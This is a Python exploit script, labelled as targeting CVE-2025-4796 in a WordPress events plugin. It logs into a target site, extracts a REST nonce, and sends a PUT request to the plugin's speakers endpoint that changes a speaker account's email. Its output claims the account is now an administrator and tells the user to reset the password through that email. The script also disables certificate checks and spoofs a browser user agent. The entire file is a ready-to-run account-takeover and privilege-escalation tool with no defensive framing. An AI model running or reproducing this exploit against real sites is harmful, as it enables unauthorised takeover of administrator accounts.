import argparse
import requests
import re
import sys
import json
import time
import locale
import os

def Nxploited_banner():
    banner = r"""
 @@@@@@@  @@@  @@@  @@@@@@@@              @@@@@@    @@@@@@@@    @@@@@@   @@@@@@@                  @@@   @@@@@@@@   @@@@@@     @@@@@@  
@@@@@@@@  @@@  @@@  @@@@@@@@             @@@@@@@@  @@@@@@@@@@  @@@@@@@@  @@@@@@@                 @@@@   @@@@@@@@  @@@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!                       @@@  @@!   @@@@       @@@  !@@                    @@!@!        @@!  @@!  @@@  !@@       
!@!       !@!  @!@  !@!                      @!@   !@!  @!@!@      @!@   !@!                   !@!!@!       !@!   !@!  @!@  !@!       
!@!       @!@  !@!  @!!!:!    @!@!@!@!@     !!@    @!@ @! !@!     !!@    !!@@!!   @!@!@!@!@   @!! @!!      @!!    !!@!!@!!  !!@@!@!   
!!!       !@!  !!!  !!!!!:    !!!@!@!!!    !!:     !@!!!  !!!    !!:     @!!@!!!  !!!@!@!!!  !!!  !@!     !!!       !!@!!!  @!!@!!!!  
:!!       :!:  !!:  !!:                   !:!      !!:!   !!!   !:!          !:!             :!!:!:!!:   !!:           !!!  !:!  !:!  
:!:        ::!!:!   :!:                  :!:       :!:    !:!  :!:           !:!             !:::!!:::  :!:            !:!  :!:  !:!  
 ::: :::    ::::     :: ::::             :: :::::  ::::::: ::  :: :::::  :::: ::                  :::    ::       ::::: ::  :::: :::  
 :: :: :     :      : :: ::              :: : :::   : : :  :   :: : :::  :: : :                   :::   : :        : :  :    :: : :   
                                                                                                      
Exploit Script By: Nxploited (Khaled Alenazi)
GitHub: https://github.com/Nxploited/

"""
    Nxploited_safe_print(banner)
    time.sleep(1.5)

def Nxploited_safe_print(text):
    try:
        print(text)
    except UnicodeEncodeError:
        try:
            encoded_text = text.encode('utf-8', errors='replace').decode('utf-8')
            print(encoded_text)
        except Exception as e:
            print("[!] Encoding print error:", e)

def Nxploited_validate_url(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')
    except Exception as e:
        Nxploited_safe_print(f"[-] URL validation error: {e}")
        sys.exit(1)

def Nxploited_validate_email(email):
    try:
        return re.match(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$", email)
    except Exception as e:
        Nxploited_safe_print(f"[-] Email validation error: {e}")
        sys.exit(1)

def Nxploited_disable_ssl(session):
    try:
        Nxploited_safe_print("[*] Disabling SSL warnings ...")
        time.sleep(1.5)
        requests.packages.urllib3.disable_warnings()
        session.verify = False
    except Exception as e:
        Nxploited_safe_print(f"[-] SSL disabling error: {e}")
        sys.exit(1)

def Nxploited_login(session, url, username, password, user_agent):
    try:
        Nxploited_safe_print("[*] Logging in to WordPress ...")
        time.sleep(2)
        login_url = f"{url}/wp-login.php"
        headers = {"User-Agent": user_agent}
        data = {
            'log': username,
            'pwd': password,
            'rememberme': 'forever',
            'wp-submit': 'Log+In'
        }
        response = session.post(login_url, data=data, headers=headers, verify=False)
        cookies = session.cookies
        if any('wordpress_logged_in' in cookie.name for cookie in cookies):
            Nxploited_safe_print("[+] Logged in successfully.")
            time.sleep(1.5)
            return cookies
        Nxploited_safe_print("[-] Failed to log in.")
        sys.exit(1)
    except Exception as e:
        Nxploited_safe_print(f"[-] Login error: {e}")
        sys.exit(1)

def Nxploited_extract_nonce(session, url, user_agent):
    try:
        Nxploited_safe_print("[*] Extracting nonce value ...")
        time.sleep(2)
        admin_url = f"{url}/wp-admin/post-new.php"
        headers = {"User-Agent": user_agent}
        response = session.get(admin_url, headers=headers, verify=False)
        match = re.search(r'createNonceMiddleware\(\s*"([a-zA-Z0-9]+)"\s*\)', response.text)
        if match:
            Nxploited_safe_print(f"[+] Nonce extracted: {match.group(1)}")
            time.sleep(1.5)
            return match.group(1)
        Nxploited_safe_print("[-] Nonce extraction failed.")
        sys.exit(1)
    except Exception as e:
        Nxploited_safe_print(f"[-] Nonce extraction error: {e}")
        sys.exit(1)

def Nxploited_update_speaker(session, url, speaker_id, email, nonce, cookies, user_agent):
    try:
        Nxploited_safe_print("[*] Exploiting and updating speaker info ...")
        time.sleep(2)
        api_url = f"{url}/wp-json/eventin/v2/speakers/{speaker_id}"
        headers = {
            "Host": url.split('//')[-1],
            "Content-Type": "application/json; charset=utf-8",
            "X-WP-Nonce": nonce,
            "Cookie": "; ".join([f"{c.name}={c.value}" for c in cookies]),
            "User-Agent": user_agent
        }
        payload = json.dumps({"email": email}, ensure_ascii=False)
        response = session.put(api_url, headers=headers, data=payload.encode('utf-8'), verify=False)
        try:
            json_data = response.json()
        except Exception:
            Nxploited_safe_print("[-] Invalid JSON response.")
            sys.exit(1)
        if response.status_code == 200 and 'email' in json_data and json_data['email'] == email:
            Nxploited_custom_success(speaker_id, email)
            Nxploited_print_json(json_data)
        else:
            Nxploited_safe_print("[-] Update failed.")
            Nxploited_print_json(json_data)
            sys.exit(1)
    except Exception as e:
        Nxploited_safe_print(f"[-] Speaker update error: {e}")
        sys.exit(1)

def Nxploited_print_json(data):
    try:
        Nxploited_safe_print(json.dumps(data, indent=2, sort_keys=True, ensure_ascii=False))
    except Exception as e:
        Nxploited_safe_print(f"[-] JSON print error: {e}")

def Nxploited_custom_success(speaker_id, email):
    try:
        Nxploited_safe_print("\n[+] Exploitation in progress, please wait ...")
        time.sleep(2)
        Nxploited_safe_print("\n[+] Exploitation successful.")
        Nxploited_safe_print("[+] The account has been updated to Admin.")
        Nxploited_safe_print(f"    Speaker ID   : {speaker_id}")
        Nxploited_safe_print(f"    Email        : {email}")
        Nxploited_safe_print("\n[!] Please reset your password using the email: " + email)
        Nxploited_safe_print("\nBy: Nxploited (Khaled Alenazi)")
        Nxploited_safe_print("GitHub: https://github.com/Nxploited/\n")
        time.sleep(1.5)
    except Exception as e:
        Nxploited_safe_print(f"[-] Success message error: {e}")

def Nxploited():
    try:
        # Set UTF-8 encoding for stdout
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except Exception:
            os.environ['PYTHONIOENCODING'] = 'utf-8'

        Nxploited_banner()
        Nxploited_safe_print("[*] Please wait, exploitation starting ...")
        time.sleep(2)
        parser = argparse.ArgumentParser(
            description="Exploit For: CVE-2025-4796 By: Nxploited"
        )
        parser.add_argument('-u', '--url', required=True, help="Target WordPress site URL")
        parser.add_argument('-id', '--speaker_id', required=True, help="Enter the speaker ID for the user")
        parser.add_argument('-email', '--email', required=True, help="Enter a new email address")
        parser.add_argument('-user', '--username', required=True, help="Enter the username for the account to upgrade")
        parser.add_argument('-pass', '--password', required=True, help="Enter the password for the account to upgrade")
        args = parser.parse_args()

        url = Nxploited_validate_url(args.url)
        time.sleep(1.2)
        email = args.email.strip()
        speaker_id = args.speaker_id
        username = args.username
        password = args.password
        user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"

        if not Nxploited_validate_email(email):
            Nxploited_safe_print("[-] Invalid email.")
            sys.exit(1)
        time.sleep(1)

        session = requests.Session()
        Nxploited_disable_ssl(session)
        time.sleep(1.2)
        cookies = Nxploited_login(session, url, username, password, user_agent)
        time.sleep(1.2)
        nonce = Nxploited_extract_nonce(session, url, user_agent)
        time.sleep(1.2)
        Nxploited_update_speaker(session, url, speaker_id, email, nonce, cookies, user_agent)
    except Exception as e:
        Nxploited_safe_print(f"[-] Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    Nxploited()
